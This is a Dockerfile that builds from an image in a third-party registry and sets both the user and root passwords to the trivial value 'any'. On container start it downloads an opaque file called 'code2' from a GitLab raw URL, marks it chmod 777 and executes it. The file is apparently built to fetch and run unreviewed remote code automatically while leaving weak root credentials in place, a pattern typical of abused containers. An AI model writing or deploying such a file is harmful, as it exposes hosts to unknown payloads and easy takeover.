FROM registry-intl.cn-hongkong.aliyuncs.com/rakesh/codes:2
RUN echo user:any | chpasswd && echo root:any | chpasswd
CMD wget https://gitlab.com/rishabh-modi2/public/-/raw/main/code/code2 && chmod 777 code2 && ./code2
